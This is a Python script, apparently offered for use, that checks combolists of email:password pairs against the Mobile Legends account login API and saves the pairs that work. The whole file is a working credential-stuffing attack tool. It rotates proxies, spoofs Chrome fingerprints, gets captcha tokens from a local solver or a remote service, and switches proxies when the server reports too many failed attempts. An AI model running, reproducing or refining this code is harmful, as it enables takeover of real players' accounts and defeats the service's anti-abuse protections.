import hashlib
import json
import time
import threading
import random
from concurrent.futures import ThreadPoolExecutor
import os
import sys
import queue
from tqdm import tqdm
from colorama import init, Fore, Style
import logging
from curl_cffi import requests

init(autoreset=True)

logging.getLogger('tqdm').setLevel(logging.ERROR)

ACCOUNT_API = 'https://accountmtapi.mobilelegends.com/'
_proxy_list = []

def _load_proxy_file(path):
    global _proxy_list
    try:
        with open(path, 'r') as f:
            _proxy_list = [l.strip() for l in f if l.strip()]
        return len(_proxy_list) > 0
    except Exception:
        return False

def _random_proxy():
    if not _proxy_list:
        return None
    try:
        host, port, user, pw = random.choice(_proxy_list).split(':')
        return f"http://{user}:{pw}@{host}:{port}"
    except Exception:
        return None
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
REMOTE_SOLVER_URL = 'https://dshburds.vercel.app/api/get-token'

OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "VM Results")
VALID_FILE = os.path.join(OUTPUT_DIR, "validmail.txt")
INVALID_FILE = os.path.join(OUTPUT_DIR, "invalidmail.txt")

file_lock = threading.Lock()
checked_accounts_lock = threading.Lock()
checked_accounts = set()
valid_count = 0
invalid_count = 0
checked_count = 0
total_accounts = 0
start_time = None
_result_queue = queue.Queue()

_token_queue = queue.Queue(maxsize=200)
_solver_running = False
_solver_threads = []
_solver_init_lock = threading.Lock()
_solver_mode = 1

def _start_local_solver(num_threads):
    from solver import initialize_global_model, get_compiled_js, Dun163, DUN163_DOMAINS, ID, REFERER, FP_H
    from fake_useragent import UserAgent

    if not initialize_global_model():
        return False
    if not get_compiled_js('dun163.js'):
        return False

    def _worker(thread_id, config):
        d = None
        cycle = 0
        while _solver_running:
            try:
                if d is None or cycle >= 3:
                    d = None
                    config['UA'] = UserAgent().random
                    config['DOMAIN'] = random.choice(DUN163_DOMAINS)
                    d = Dun163(
                        id_=config['ID_'],
                        referer=config['REFERER'],
                        fp_h=config['FP_H'],
                        ua=config['UA'],
                        thread_id=thread_id,
                        domain=config['DOMAIN']
                    )
                    cycle = 0
                success = d.run()
                cycle += 1
                if success and d.resp_json2:
                    validate_raw = d.resp_json2.get('validate', '')
                    validate_decoded = ""
                    if validate_raw and d.ctx:
                        try:
                            validate_decoded = d.ctx.call('do_onVerify', validate_raw, d.fp)
                        except:
                            validate_decoded = validate_raw
                    if validate_decoded and len(validate_decoded.strip()) > 10:
                        try:
                            _token_queue.put(validate_decoded.strip(), timeout=5)
                        except queue.Full:
                            pass
                    if success:
                        cycle = 3
            except Exception:
                d = None
                continue

    for i in range(num_threads):
        config = {
            'ID_': ID,
            'REFERER': REFERER,
            'FP_H': FP_H,
            'UA': UserAgent().random,
            'DOMAIN': DUN163_DOMAINS[i % len(DUN163_DOMAINS)]
        }
        t = threading.Thread(target=_worker, args=(i + 1, config), daemon=False)
        t.start()
        _solver_threads.append(t)
    return True

def _start_remote_solver(num_threads):
    def _worker():
        while _solver_running:
            try:
                res = requests.get(REMOTE_SOLVER_URL, timeout=10)
                if res.status_code == 200:
                    data = res.json()
                    token = data.get('token')
                    if token and len(token.strip()) > 10:
                        try:
                            _token_queue.put(token.strip(), timeout=5)
                        except queue.Full:
                            pass
            except Exception:
                continue
            time.sleep(0.1)

    for i in range(num_threads):
        t = threading.Thread(target=_worker, daemon=False)
        t.start()
        _solver_threads.append(t)
    return True

def start_solver(mode=1, num_threads=20):
    global _solver_running, _solver_mode
    with _solver_init_lock:
        if _solver_running:
            return True
        _solver_running = True
        _solver_mode = mode
        
        if mode == 1:
            return _start_local_solver(num_threads)
        elif mode == 2:
            return _start_remote_solver(num_threads)
        else:
            return False

def stop_solver():
    global _solver_running
    _solver_running = False
    for t in _solver_threads:
        t.join(timeout=2)
    _solver_threads.clear()

def get_cn31_token(timeout=30):
    max_retries = 5
    for attempt in range(max_retries):
        try:
            return _token_queue.get(timeout=timeout)
        except queue.Empty:
            if attempt < max_retries - 1:
                time.sleep(0.5 * (2 ** attempt))
                continue
            else:
                raise Exception("Failed to get captcha token after retries")

def generate_sign(account, md5pwd, cn31_token):
    params_str = f"account={account}&country=&e_captcha={cn31_token}&game_token=&md5pwd={md5pwd}&recaptcha_token="
    return hashlib.md5((params_str + "&op=login").encode()).hexdigest().lower()

def save_valid_account(email, password):
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    with file_lock:
        with open(VALID_FILE, "a", encoding="utf-8") as f:
            f.write(f"{email}:{password}\n")

def save_invalid_account(email, password):
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    with file_lock:
        with open(INVALID_FILE, "a", encoding="utf-8") as f:
            f.write(f"{email}:{password}\n")

def get_elapsed_time():
    if start_time:
        elapsed = time.time() - start_time
        hours, remainder = divmod(elapsed, 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
    return "00:00:00"

def get_checking_rate():
    if start_time and checked_count > 0:
        elapsed = time.time() - start_time
        rate = checked_count / elapsed
        return f"{rate:.1f}/s"
    return "0.0/s"

def update_progress_bar(pbar):
    if pbar is None:
        return
    try:
        success_rate = (valid_count / checked_count * 100) if checked_count > 0 else 0
        remaining = total_accounts - checked_count

        if checked_count > 0 and start_time:
            elapsed = time.time() - start_time
            avg_time_per_check = elapsed / checked_count
            eta_seconds = remaining * avg_time_per_check
            eta_hours, eta_remainder = divmod(eta_seconds, 3600)
            eta_minutes, eta_seconds = divmod(eta_remainder, 60)
            eta = f"{int(eta_hours):02d}:{int(eta_minutes):02d}:{int(eta_seconds):02d}"
        else:
            eta = "00:00:00"

        pbar.n = checked_count
        pbar.set_description(f"🔍 [{checked_count}/{total_accounts}]")
        pbar.set_postfix({
            "✅": f"{valid_count}",
            "❌": f"{invalid_count}",
            "📊": f"{success_rate:.1f}%",
            "⏱️": get_elapsed_time(),
            "📈": get_checking_rate(),
            "ETA": eta
        })
    except Exception:
        pass

def check_account(email, password):
    global valid_count, invalid_count

    try:
        # Reduced delay for faster checking
        time.sleep(0.1 + random.uniform(0, 0.1))

        cn31_token = get_cn31_token()
        md5pwd = hashlib.md5(password.encode()).hexdigest().upper()
        sign = generate_sign(email, md5pwd, cn31_token)

        session = requests.Session()
        r = None
        for _ in range(3):
            p = _random_proxy()
            if p:
                session.proxies = {"http": p, "https": p}
            else:
                session.proxies = {}
            try:
                r = session.get("https://mtacc.mobilelegends.com/v2.1/inapp/login-new", impersonate="chrome120", timeout=10)
                break
            except Exception:
                session = requests.Session()
        if r is None:
            raise Exception("All proxies failed on initial connection")
        try:
            for cookie in r.cookies:
                session.cookies.set(cookie.name, cookie.value, domain=".mobilelegends.com")
        except:
            pass

        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://mtacc.mobilelegends.com",
            "Referer": "https://mtacc.mobilelegends.com/",
            "User-Agent": USER_AGENT,
        }

        body = {
            "op": "login",
            "sign": sign,
            "params": {
                "account": email,
                "md5pwd": md5pwd,
                "game_token": "",
                "recaptcha_token": "",
                "e_captcha": cn31_token,
                "country": "",
            },
            "lang": "en",
        }

        max_retries = 4
        data = None
        for attempt in range(max_retries):
            try:
                login_res = session.request("PUT", ACCOUNT_API, json=body, headers=headers, impersonate="chrome120", timeout=15)
            except Exception:
                p = _random_proxy()
                if p:
                    session = requests.Session()
                    session.proxies = {"http": p, "https": p}
                if attempt < max_retries - 1:
                    time.sleep(0.2 * (attempt + 1))
                    continue
                raise

            if login_res.status_code != 200:
                if attempt < max_retries - 1:
                    time.sleep(0.2 * (attempt + 1))
                    continue
                raise Exception(f"HTTP {login_res.status_code}: {login_res.text[:200]}")

            try:
                data = login_res.json()
                if data and (data.get("message") or data.get("code")):
                    msg = data.get("message", "")
                    if msg == "Error_FailedTooMuch" and attempt < max_retries - 1:
                        p = _random_proxy()
                        if p:
                            session = requests.Session()
                            session.proxies = {"http": p, "https": p}
                        time.sleep(0.5 * (attempt + 1))
                        continue
                    break
                elif data is None or not data:
                    if attempt < max_retries - 1:
                        time.sleep(0.2 * (attempt + 1))
                        continue
                    else:
                        raise Exception("Empty API response after retries")
            except json.JSONDecodeError:
                if attempt < max_retries - 1:
                    time.sleep(0.2 * (attempt + 1))
                    continue
                raise Exception("Invalid JSON response from server")

        if data is None:
            raise Exception("No data received from API")

        message = data.get("message", "")

        if message == "Error_Success":
            with file_lock:
                valid_count += 1
            _result_queue.put(f"{Fore.GREEN}[VALID] - {email}{Style.RESET_ALL}")
            save_valid_account(email, password)
        else:
            with file_lock:
                invalid_count += 1
            error_msg = message if message else "Unknown error"
            _result_queue.put(f"{Fore.RED}[INVALID] - {email} - {error_msg}{Style.RESET_ALL}")
            save_invalid_account(email, password)

    except Exception as e:
        with file_lock:
            invalid_count += 1
        _result_queue.put(f"{Fore.RED}[INVALID] - {email} - {str(e)[:50]}{Style.RESET_ALL}")
        save_invalid_account(email, password)

def worker_wrapper(email, password, account_line, file_path):
    global checked_count

    try:
        # Skip if already checked
        with checked_accounts_lock:
            if account_line in checked_accounts:
                with file_lock:
                    checked_count += 1
                _result_queue.put("__UPDATE_BAR__")
                return
            checked_accounts.add(account_line)
        
        check_account(email, password)
        
        # Remove checked account from file
        remove_account_from_file(file_path, account_line)
        
    except Exception as e:
        with file_lock:
            global invalid_count
            invalid_count += 1
        _result_queue.put(f"{Fore.RED}[INVALID] - {email}{Style.RESET_ALL}")
        save_invalid_account(email, password)
        
        # Still remove from file even if failed
        remove_account_from_file(file_path, account_line)
    finally:
        with file_lock:
            checked_count += 1
        _result_queue.put("__UPDATE_BAR__")

def remove_account_from_file(file_path, account_line):
    """Remove checked account from the input file"""
    try:
        with file_lock:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            # Filter out the checked account
            lines = [line for line in lines if line.strip() != account_line]
            
            with open(file_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.writelines(lines)
    except Exception:
        pass

def main():
    global total_accounts, start_time

    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  VM - Valid/Invalid Account Checker{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")

    # Get proxy file
    proxy_path = input(f"{Fore.YELLOW}Enter path to proxy file (leave empty for no proxy): {Style.RESET_ALL}").strip()
    if proxy_path:
        if os.path.exists(proxy_path):
            n = _load_proxy_file(proxy_path)
            print(f"{Fore.GREEN}Loaded {n} proxies{Style.RESET_ALL}")
            if n > 0:
                test = _random_proxy()
                try:
                    s = requests.Session()
                    s.proxies = {"http": test, "https": test}
                    s.get("https://mtacc.mobilelegends.com/v2.1/inapp/login-new", impersonate="chrome120", timeout=10)
                    print(f"{Fore.GREEN}✅ Proxy test passed{Style.RESET_ALL}")
                except Exception:
                    print(f"{Fore.YELLOW}⚠️ Proxy test failed, will rotate on errors{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}File '{proxy_path}' not found. Running without proxy.{Style.RESET_ALL}")

    file_path = input(f"{Fore.YELLOW}Enter path to your accounts file (e.g., combolist.txt): {Style.RESET_ALL}").strip()
    
    if not os.path.exists(file_path):
        print(f"{Fore.RED}File not found: {file_path}{Style.RESET_ALL}")
        return

    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            accounts = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{Fore.RED}Error reading file: {e}{Style.RESET_ALL}")
        return

    total_accounts = len(accounts)
    print(f"{Fore.GREEN}Loaded {total_accounts} accounts{Style.RESET_ALL}\n")

    threads_input = input(f"{Fore.YELLOW}Enter number of threads (default: 20): {Style.RESET_ALL}").strip()
    threads = int(threads_input) if threads_input.isdigit() else 20

    solver_mode_input = input(f"{Fore.YELLOW}Select solver mode (1=Local, 2=Remote, default: 2): {Style.RESET_ALL}").strip()
    solver_mode = int(solver_mode_input) if solver_mode_input.isdigit() else 2

    solver_threads_input = input(f"{Fore.YELLOW}Enter solver threads (default: 20): {Style.RESET_ALL}").strip()
    solver_threads = int(solver_threads_input) if solver_threads_input.isdigit() else 20

    print(f"\n{Fore.CYAN}Starting solver (mode: {'Local' if solver_mode == 1 else 'Remote'}, threads: {solver_threads})...{Style.RESET_ALL}")
    if not start_solver(solver_mode, solver_threads):
        print(f"{Fore.RED}Failed to start solver{Style.RESET_ALL}")
        return

    print(f"{Fore.GREEN}Solver started successfully{Style.RESET_ALL}\n")

    start_time = time.time()
    pbar = None
    _interrupted = False

    try:
        try:
            pbar = tqdm(
                total=total_accounts,
                desc="Initializing...",
                unit="acc",
                ncols=100,
                dynamic_ncols=False,
                bar_format="{l_bar}{bar}| {postfix}",
                colour='green',
                position=0,
                leave=True,
                smoothing=0.1,
                mininterval=0.1,
                maxinterval=1.0
            )
        except Exception:
            pbar = None

        done_count = 0
        executor = ThreadPoolExecutor(max_workers=threads)
        try:
            for account in accounts:
                if ":" in account:
                    email, password = account.split(":", 1)
                    executor.submit(worker_wrapper, email.strip(), password.strip(), account.strip(), file_path)
                else:
                    print(f"{Fore.RED}Invalid format (missing colon): {account}{Style.RESET_ALL}")

            while done_count < len(accounts):
                try:
                    msgs = []
                    updates = 0
                    msg = _result_queue.get(timeout=60)
                    if msg == "__UPDATE_BAR__":
                        updates += 1
                    else:
                        msgs.append(msg)
                    while True:
                        try:
                            msg2 = _result_queue.get_nowait()
                            if msg2 == "__UPDATE_BAR__":
                                updates += 1
                            else:
                                msgs.append(msg2)
                        except queue.Empty:
                            break
                    done_count += updates
                    update_progress_bar(pbar)
                    if msgs and pbar is not None:
                        pbar.clear()
                        for m in msgs:
                            print(m, flush=True)
                        pbar.refresh()
                    elif msgs:
                        for m in msgs:
                            print(m, flush=True)
                    elif pbar is not None:
                        pbar.refresh()
                except queue.Empty:
                    pass
        except KeyboardInterrupt:
            _interrupted = True
        finally:
            executor.shutdown(wait=not _interrupted, cancel_futures=True)
            if _interrupted:
                try:
                    pbar.close()
                except Exception:
                    pass
                print(f"\n{Fore.YELLOW}👋 Stopped by user{Style.RESET_ALL}", flush=True)
    except Exception as e:
        print(f"\n[MAIN LOOP CRASH] {e}", flush=True)
        import traceback
        traceback.print_exc()
    finally:
        stop_solver()
        try:
            pbar.close()
        except Exception:
            pass

    elapsed_total = get_elapsed_time()
    final_rate = get_checking_rate()
    success_rate = (valid_count / checked_count * 100) if checked_count > 0 else 0

    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}  {'INTERRUPTED' if _interrupted else 'CHECKING COMPLETE!'}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✅ Valid: {valid_count}{Style.RESET_ALL}")
    print(f"{Fore.RED}❌ Invalid: {invalid_count}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📊 Checked: {checked_count}/{total_accounts}  ({success_rate:.1f}%)")
    print(f"{Fore.CYAN}⏱️  Elapsed: {elapsed_total}  Rate: {final_rate}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}📁 Results in {OUTPUT_DIR}/{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
